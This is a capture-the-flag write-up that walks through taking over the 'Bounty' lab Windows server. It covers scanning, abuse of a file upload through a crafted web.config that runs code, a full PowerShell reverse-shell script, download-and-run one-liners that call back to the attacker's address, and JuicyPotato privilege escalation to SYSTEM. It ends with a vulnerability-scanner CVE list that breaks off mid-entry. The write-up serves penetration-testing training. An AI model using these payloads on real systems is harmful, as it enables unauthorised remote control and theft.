# Bounty

| Category | |
|---|---|
| OS | Windows |
| Difficulty | Easy |
| Name | Bounty |
| Target IP(s) | 10.129.174.221 |
| Foothold |  |
| PrivEsc | |
| Tech | |
| Includes | OSCP-Prep |

 
## Service scan
Full TCP scan
```
# Nmap 7.91 scan initiated Sun Jul 18 23:49:20 2021 as: nmap -vv --stats-every 20s -p- --min-rate 10000 -oA scans/nmap-full_scan_tcp 10.129.174.221
Nmap scan report for 10.129.174.221
Host is up, received echo-reply ttl 127 (0.036s latency).
Scanned at 2021-07-18 23:49:20 EDT for 13s
Not shown: 65534 filtered ports
Reason: 65534 no-responses
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
# Nmap done at Sun Jul 18 23:49:33 2021 -- 1 IP address (1 host up) scanned in 13.46 seconds

```

Full UDP scan
```
# Nmap 7.91 scan initiated Sun Jul 18 23:49:33 2021 as: nmap -vv --stats-every 20s -sU -p- --min-rate 10000 -oA scans/nmap-full_scan_udp 10.129.174.221
Nmap scan report for 10.129.174.221
Host is up, received echo-reply ttl 127 (0.035s latency).
All 65535 scanned ports on 10.129.174.221 are open|filtered because of 65535 no-responses

Read data files from: /usr/bin/../share/nmap
# Nmap done at Sun Jul 18 23:49:47 2021 -- 1 IP address (1 host up) scanned in 13.63 seconds

```

Specific TCP port scan
```
# Nmap 7.91 scan initiated Sun Jul 18 23:50:35 2021 as: nmap --reason -Pn --stats-every 20s -sV -p 80 "--script=banner,(http* or ssl*) and not (brute or broadcast or dos or external or http-slowloris* or fuzzer)" -oA scans/tcp_80_http_nmap 10.129.174.221
Nmap scan report for 10.129.174.221
Host is up, received user-set (0.032s latency).

PORT   STATE SERVICE REASON          VERSION
80/tcp open  http    syn-ack ttl 127 Microsoft IIS httpd 7.5
|_http-chrono: Request times for /; avg: 205.73ms; min: 202.59ms; max: 210.66ms
| http-comments-displayer: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.129.174.221
|     
|     Path: http://10.129.174.221:80/
|     Line number: 7
|     Comment: 
|         
|         
|         
|         
|         
|         
|         
|         
|         
|         
|         
|         
|         
|         
|         
|         
|         
|_        -->
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-date: Mon, 19 Jul 2021 03:50:42 GMT; -2s from local time.
|_http-devframework: ASP.NET detected. Found related header.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-errors: Couldn't find any error pages.
|_http-exif-spider: ERROR: Script execution failed (use -d to debug)
|_http-feed: Couldn't find any feeds.
|_http-fetch: Please enter the complete path of the directory to save data in.
| http-headers: 
|   Content-Length: 630
|   Content-Type: text/html
|   Last-Modified: Thu, 31 May 2018 03:46:26 GMT
|   Accept-Ranges: bytes
|   ETag: "20ba8ef391f8d31:0"
|   Server: Microsoft-IIS/7.5
|   X-Powered-By: ASP.NET
|   Date: Mon, 19 Jul 2021 03:50:44 GMT
|   Connection: close
|   
|_  (Request type: HEAD)
|_http-malware-host: Host appears to be clean
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-mobileversion-checker: No mobile version detected.
|_http-referer-checker: Couldn't find any cross-domain scripts.
|_http-security-headers: 
|_http-server-header: Microsoft-IIS/7.5
| http-sitemap-generator: 
|   Directory structure:
|     /
|       Other: 1; jpg: 1
|   Longest directory structure:
|     Depth: 0
|     Dir: /
|   Total files found (by extension):
|_    Other: 1; jpg: 1
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-title: Bounty
| http-traceroute: 
|_  Possible reverse proxy detected.
| http-useragent-tester: 
|   Status for browser useragent: 200
|   Allowed User Agents: 
|     Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
|     libwww
|     lwp-trivial
|     libcurl-agent/1.0
|     PHP/
|     Python-urllib/2.5
|     GT::WWW
|     Snoopy
|     MFC_Tear_Sample
|     HTTP::Lite
|     PHPCrawl
|     URI::Fetch
|     Zend_Http_Client
|     http client
|     PECL::HTTP
|     Wget/1.13.4 (linux-gnu)
|_    WWW-Mechanize/1.34
| http-vhosts: 
|_128 names had status 200
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jul 18 23:54:58 2021 -- 1 IP address (1 host up) scanned in 263.62 seconds

```


findings from gobuster
```
http://10.129.174.221:80/aspnet_client        (Status: 301) [Size: 162] [--> http://10.129.174.221:80/aspnet_client/]
http://10.129.174.221:80/transfer.aspx        (Status: 200) [Size: 941]
http://10.129.174.221:80/uploadedfiles        (Status: 301) [Size: 162] [--> http://10.129.174.221:80/uploadedfiles/]
```




After uploading an aspx reverse shell :

![[Pasted image 20210718235459.png]]

Trying to upload merlin.jpg from the main page works:
![[Pasted image 20210718235737.png]]

create a web.config as described here (https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/) and upload it
```
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />        
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
<%
Response.write("-"&"->")
' it is running the ASP code if you can see 3 by opening the web.config file!
Response.write(1+2)
Response.write("<!-"&"-")
%>
-->
```

![[Pasted image 20210719001822.png]]

clone: https://github.com/samratashok/nishang

copy `Invoke-PowerShellTcp.ps1` to local folder, rename it to `revShell.ps1` and add 
`Invoke-PowerShellTcp -Reverse -IPAddress 10.10.17.226 -Port 1234` to the end of the file. The complete file looks like:

```
function Invoke-PowerShellTcp 
{ 
<#
.SYNOPSIS
Nishang script which can be used for Reverse or Bind interactive PowerShell from a target. 

.DESCRIPTION
This script is able to connect to a standard netcat listening on a port when using the -Reverse switch. 
Also, a standard netcat can connect to this script Bind to a specific port.

The script is derived from Powerfun written by Ben Turner & Dave Hardy

.PARAMETER IPAddress
The IP address to connect to when using the -Reverse switch.

.PARAMETER Port
The port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens.

.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444

Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on 
the given IP and port. 

.EXAMPLE
PS > Invoke-PowerShellTcp -Bind -Port 4444

Above shows an example of an interactive PowerShell bind connect shell. Use a netcat/powercat to connect to this port. 

.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444

Above shows an example of an interactive PowerShell reverse connect shell over IPv6. A netcat/powercat listener must be
listening on the given IP and port. 

.LINK
http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html
https://github.com/nettitude/powershell/blob/master/powerfun.ps1
https://github.com/samratashok/nishang
#>      
    [CmdletBinding(DefaultParameterSetName="reverse")] Param(

        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]
        $Port,

        [Parameter(ParameterSetName="reverse")]
        [Switch]
        $Reverse,

        [Parameter(ParameterSetName="bind")]
        [Switch]
        $Bind

    )

    
    try 
    {
        #Connect back if the reverse switch is used.
        if ($Reverse)
        {
            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
        }

        #Bind to the provided port if Bind switch is used.
        if ($Bind)
        {
            $listener = [System.Net.Sockets.TcpListener]$Port
            $listener.start()    
            $client = $listener.AcceptTcpClient()
        } 

        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535|%{0}

        #Send back current username and computername
        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
        $stream.Write($sendbytes,0,$sendbytes.Length)

        #Show an interactive PowerShell prompt
        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
        $stream.Write($sendbytes,0,$sendbytes.Length)

        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
        {
            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
            $data = $EncodedText.GetString($bytes,0, $i)
            try
            {
                #Execute the command on the target.
                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
            }
            catch
            {
                Write-Warning "Something went wrong with execution of command on the target." 
                Write-Error $_
            }
            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
            $x = ($error[0] | Out-String)
            $error.clear()
            $sendback2 = $sendback2 + $x

            #Return the results
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()  
        }
        $client.Close()
        if ($listener)
        {
            $listener.Stop()
        }
    }
    catch
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
        Write-Error $_
    }
}

Invoke-PowerShellTcp -Reverse -IPAddress 10.10.17.226 -Port 1234
```

The web.config looks like 
```
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<%@ Language=VBScript %>
<%
  call Server.CreateObject("WSCRIPT.SHELL").Run("cmd.exe /c powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.17.226/revShell.ps1')")
%>

```


Start a local http server on port 80
```
└─$ python3 -m http.server 80                   
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
127.0.0.1 - - [19/Jul/2021 00:46:22] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -
10.129.174.221 - - [19/Jul/2021 00:46:45] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -
10.129.174.221 - - [19/Jul/2021 00:46:46] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -
```

Start netcat listerner on port 1234. Afterwards upload web.config and call it again.

```
─$ nc -nlvp 1234  
listening on [any] 1234 ...
connect to [10.10.17.226] from (UNKNOWN) [10.129.174.221] 49159
Windows PowerShell running as user BOUNTY$ on BOUNTY
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\windows\system32\inetsrv>whoami
bounty\merlin
```

## get the user.txt
```
PS C:\windows\system32\inetsrv> cd\
PS C:\> dir


    Directory: C:\


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
d----         5/30/2018   4:14 AM            inetpub                           
d----         7/14/2009   6:20 AM            PerfLogs                          
d-r--         6/10/2018   3:43 PM            Program Files                     
d-r--         7/14/2009   8:06 AM            Program Files (x86)               
d-r--         5/31/2018  12:18 AM            Users                             
d----         5/31/2018  11:37 AM            Windows                           


PS C:\> cd Users
PS C:\Users> dir


    Directory: C:\Users


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
d----         5/31/2018  12:18 AM            Administrator                     
d----         5/30/2018   4:44 AM            Classic .NET AppPool              
d----         5/30/2018  12:22 AM            merlin                            
d-r--         5/30/2018   5:44 AM            Public                            


PS C:\Users> cd merlin
PS C:\Users\merlin> dir


    Directory: C:\Users\merlin


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
d-r--         5/30/2018  12:22 AM            Contacts                          
d-r--         5/31/2018  12:17 AM            Desktop                           
d-r--         5/30/2018  12:22 AM            Documents                         
d-r--         5/30/2018  12:22 AM            Downloads                         
d-r--         5/30/2018  12:22 AM            Favorites                         
d-r--         5/30/2018  12:22 AM            Links                             
d-r--         5/30/2018  12:22 AM            Music                             
d-r--         5/30/2018  12:22 AM            Pictures                          
d-r--         5/30/2018  12:22 AM            Saved Games                       
d-r--         5/30/2018  12:22 AM            Searches                          
d-r--         5/30/2018  12:22 AM            Videos                            


PS C:\Users\merlin> cd Desktop
PS C:\Users\merlin\Desktop> dir
PS C:\Users\merlin\Desktop> attrib
A  SH        C:\Users\merlin\Desktop\desktop.ini
A   H        C:\Users\merlin\Desktop\user.txt
PS C:\Users\merlin\Desktop> type user.txt
e29ad8**************************
PS C:\Users\merlin\Desktop> 
```

## Using JuicyPotato to get root.txt



Terminal 1:
start a local webserver on port 80
```
python3 -m http.server 80
```

Terminal 2: start a netcat listener 
```
nc -nlvp 1234
```

Browser:
Upload `web.config` and load it in browser (`http://10.129.174.221/uploadedfiles/web.config`)

Terminal 1 shows that the `revShell.ps1` was downloaded
```
10.129.174.221 - - [19/Jul/2021 12:02:26] "GET /revShell.ps1 HTTP/1.1" 200 -
```

and Terminal 2 shows the reverse shell
```
─$ nc -nlvp 1234                                                                   
listening on [any] 1234 ...
connect to [10.10.17.226] from (UNKNOWN) [10.129.174.221] 49209
Windows PowerShell running as user BOUNTY$ on BOUNTY
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\windows\system32\inetsrv>whoami
bounty\merlin
PS C:\windows\system32\inetsrv> 
```

Run `whoami /priv` to displays security privileges of the current user.
							
```
PS C:\windows\system32\inetsrv> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

As `SeImpersonatePrivilege` is enabled, we can try `JuicyPotato`.

For this, download `JuicyPotato` (https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe) and copy it to the shared folder, and download on the  target machine into the merlin user folder in terminal 2 with the command:

```
powershell.exe -c IEX(new-object net.webclient).downloadfile('http://10.10.17.226/JuicyPotato.exe', 'C:\Users\merlin\Desktop\juicy.exe')
```

In Terminal 1 shows it was successfully downloaded:
```
10.129.174.221 - - [19/Jul/2021 12:09:11] "GET /JuicyPotato.exe HTTP/1.1" 200 -
```

In case the terminal 2 hangs, close it, upload web.config and load it in browser again to get another reverse shell.

Create 2 more files in the shared folder.

1. copy revShell.ps1 to revShell-juicy.ps1 and change the last line to 
```
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.17.226 -Port 6666
```

2. Create a exploit.bat
```
powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.17.226/revShell-juicy.ps1')
```

Download the exploit.bat on the target machine with:
```
powershell.exe -c IEX(new-object net.webclient).downloadfile('http://10.10.17.226/exploit.bat', 'C:\Users\merlin\Desktop\exploit.bat')
```

Open terminal 3 and start a netcat listener on port 6666
```
nc -nlvp 6666
```

execute JuicyPotato in terminal 2 with the command

```
PS C:\users\merlin\desktop> ./juicy.exe -t * -p exploit.bat -l 4444
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 4444
....
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
```

In Terminal 3 we get an admin shell
```
└─$ nc -nlvp 6666                                                                 
listening on [any] 6666 ...
connect to [10.10.17.226] from (UNKNOWN) [10.129.174.221] 49207
Windows PowerShell running as user BOUNTY$ on BOUNTY
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>whoami
nt authority\system
PS C:\Windows\system32> cd \users\administrator\desktop
PS C:\users\administrator\desktop> dir


    Directory: C:\users\administrator\desktop


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a---         5/31/2018  12:18 AM         32 root.txt                          


PS C:\users\administrator\desktop> type root.txt
c837f7**************************
```
                                                                                                                     
## Windows Exploit Suggester

Get the `systeminfo` first.
```
PS C:\windows\system32\inetsrv> systeminfo

Host Name:                 BOUNTY
OS Name:                   Microsoft Windows Server 2008 R2 Datacenter 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                55041-402-3606965-84760
Original Install Date:     5/30/2018, 12:22:24 AM
System Boot Time:          7/19/2021, 6:38:57 AM
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     2,047 MB
Available Physical Memory: 1,311 MB
Virtual Memory: Max Size:  4,095 MB
Virtual Memory: Available: 3,323 MB
Virtual Memory: In Use:    772 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Local Area Connection 3
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.129.0.1
                                 IP address(es)
                                 [01]: 10.129.174.221
                                 [02]: fe80::149a:68ee:5837:b639
                                 [03]: dead:beef::149a:68ee:5837:b639
```

Checkout `wes` (Windows Exploit Suggester - Next Generation (WES-NG)) from https://github.com/bitsadmin/wesng).

Copy the output into sysinfo.txt and run command
```
python3 wes.py sysinfo.txt -s critical > wesng_output_critical.txt
```

`wes` will output

```
Windows Exploit Suggester 0.98 ( https://github.com/bitsadmin/wesng/ )
[+] Parsing systeminfo output
[+] Operating System
    - Name: Windows Server 2008 R2 for x64-based Systems
    - Generation: 2008 R2
    - Build: 7600
    - Version: None
    - Architecture: x64-based
    - Installed hotfixes: None
[+] Loading definitions
    - Creation date of definitions: 20210705
[+] Determining missing patches
[+] Filtering duplicate vulnerabilities
[+] Applying display filters
[+] Found vulnerabilities

Date: 20130108
CVE: CVE-2013-0011
KB: KB2769369
Title: Vulnerability in Windows Print Spooler Components Could Allow Remote Code Execution
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: 
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20120110
CVE: CVE-2012-0004
KB: KB2631813
Title: Vulnerabilities in Windows Media Could Allow Remote Code Execution
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: DirectShow
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20120814
CVE: CVE-2012-1851
KB: KB2712808
Title: Vulnerabilities in Windows Networking Components Could Allow Remote Code Execution
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: 
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20120814
CVE: CVE-2012-1851
KB: KB2705219
Title: Vulnerabilities in Windows Networking Components Could Allow Remote Code Execution
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: 
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20100112
CVE: CVE-2010-0018
KB: KB972270
Title: Vulnerability in the Embedded OpenType Font Engine Could Allow Remote Code Execution
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: 
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20111229
CVE: CVE-2011-3416
KB: KB2656355
Title: Vulnerabilities in .NET Framework Could Allow Elevation of Privilege
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: Microsoft .NET Framework 3.5.1
Severity: Critical
Impact: Elevation of Privilege
Exploit: n/a

Date: 20121211
CVE: CVE-2012-4774
KB: KB2758857
Title: Vulnerability in Windows File Handling Component Could Allow Remote Code Execution
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: 
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20100608
CVE: CVE-2010-1879
KB: KB979482
Title: Vulnerabilities in Media Decompression Could Allow Remote Code Execution
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: Asycfilt.dll (COM component)
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20120313
CVE: CVE-2012-0002
KB: KB2667402
Title: Vulnerabilities in Remote Desktop Could Allow Remote Code Execution
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: 
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20120313
CVE: CVE-2012-0002
KB: KB2621440
Title: Vulnerabilities in Remote Desktop Could Allow Remote Code Execution
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: 
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20110614
CVE: CVE-2011-1868
KB: KB2535512
Title: Vulnerabilities in Distributed File System Could Allow Remote Code Execution
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: 
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20110614
CVE: CVE-2011-1268
KB: KB2536276
Title: Vulnerability in SMB Client Could Allow Remote Code Execution
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: 
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20130409
CVE: CVE-2013-1338
KB: KB2817183
Title: Cumulative Security Update for Internet Explorer
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: Windows Internet Explorer 9
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20130409
CVE: CVE-2013-1338
KB: KB2817183
Title: Cumulative Security Update for Internet Explorer
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: Windows Internet Explorer 8
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20121211
CVE: CVE-2012-4786
KB: KB2753842
Title: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Remote Code Execution
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: 
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20120214
CVE: CVE-2012-0150
KB: KB2654428
Title: Vulnerability in C Run-Time Library Could Allow Remote Code Execution
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: 
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20120508
CVE: CVE-2012-0176
KB: KB2659262
Title: Combined Security Update for Microsoft Office, Windows, .NET Framework, and Silverlight
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: 
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20120508
CVE: CVE-2012-0176
KB: KB2656410
Title: Combined Security Update for Microsoft Office, Windows, .NET Framework, and Silverlight
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: Microsoft .NET Framework 3.5.1
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20120508
CVE: CVE-2012-0176
KB: KB2676562
Title: Combined Security Update for Microsoft Office, Windows, .NET Framework, and Silverlight
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: 
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20120412
CVE: CVE-2012-0151
KB: KB2653956
Title: Vulnerability in Windows Could Allow Remote Code Execution
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: 
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20120508
CVE: CVE-2012-0165
KB: KB2659262
Title: Combined Security Update for Microsoft Office, Windows, .NET Framework, and Silverlight
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: 
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20120508
CVE: CVE-2012-0165
KB: KB2656410
Title: Combined Security Update for Microsoft Office, Windows, .NET Framework, and Silverlight
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: Microsoft .NET Framework 3.5.1
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20120508
CVE: CVE-2012-0165
KB: KB2676562
Title: Combined Security Update for Microsoft Office, Windows, .NET Framework, and Silverlight
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: 
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20120110
CVE: CVE-2012-0003
KB: KB2631813
Title: Vulnerabilities in Windows Media Could Allow Remote Code Execution
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: DirectShow
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20120508
CVE: CVE-2012-0160
KB: KB2604114
Title: Vulnerabilities in .NET Framework Could Allow Remote Code Execution
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: Microsoft .NET Framework 3.5.1
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20120710
CVE: CVE-2012-1522
KB: KB2719177
Title: Cumulative Security Update for Internet Explorer
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: Windows Internet Explorer 9
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20100413
CVE: CVE-2010-0486
KB: KB979309
Title: Vulnerabilities in Windows Could Allow Remote Code Execution
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: Cabinet File Viewer Shell Extension 6.1
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20121113
CVE: CVE-2012-1896
KB: KB2729451
Title: Vulnerabilities in .NET Framework Could Allow Remote Code Execution
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: Microsoft .NET Framework 3.5.1
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20121113
CVE: CVE-2012-1895
KB: KB2729451
Title: Vulnerabilities in .NET Framework Could Allow Remote Code Execution
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: Microsoft .NET Framework 3.5.1
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20081111
CVE: CVE-2007-0099
KB: KB954430
Title: Vulnerabilities in Microsoft XML Core Services Could Allow Remote Code Execution
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: Microsoft XML Core Services 4.0
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20120508
CVE: CVE-2012-0167
KB: KB2659262
Title: Combined Security Update for Microsoft Office, Windows, .NET Framework, and Silverlight
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: 
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20120508
CVE: CVE-2012-0167
KB: KB2656410
Title: Combined Security Update for Microsoft Office, Windows, .NET Framework, and Silverlight
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: Microsoft .NET Framework 3.5.1
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20120508
CVE: CVE-2012-0167
KB: KB2676562
Title: Combined Security Update for Microsoft Office, Windows, .NET Framework, and Silverlight
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: 
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20100511
CVE: CVE-2010-0816
KB: KB978542
Title: Vulnerability in Outlook Express and Windows Mail Could Allow Remote Code Execution
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: Windows Live Mail 2011
Severity: Critical
Impact: Remote Code Execution
Exploits: http://archives.neohapsis.com/archives/bugtraq/2010-05/0068.html, http://www.protekresearchlab.com/index.php?option=com_content&view=article&id=13&Itemid=13, http://www.securityfocus.com/bid/40052

Date: 20101012
CVE: CVE-2010-1883
KB: KB982132
Title: Vulnerability in the Embedded OpenType Font Engine Could Allow Remote Code Execution
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: 
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20130108
CVE: CVE-2013-0006
KB: KB2758694
Title: Vulnerabilities in Microsoft XML Core Services Could Allow Remote Code Execution
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: Microsoft XML Core Services 4.0
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20130108
CVE: CVE-2013-0006
KB: KB2757638
Title: Vulnerabilities in Microsoft XML Core Services Could Allow Remote Code Execution
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: Microsoft XML Core Services 3.0
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20130108
CVE: CVE-2013-0006
KB: KB2757638
Title: Vulnerabilities in Microsoft XML Core Services Could Allow Remote Code Execution
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: Microsoft XML Core Services 6.0
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20121211
CVE: CVE-2012-2556
KB: KB2753842
Title: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Remote Code Execution
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: 
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20120508
CVE: CVE-2012-0162
KB: KB2659262
Title: Combined Security Update for Microsoft Office, Windows, .NET Framework, and Silverlight
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: 
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20120508
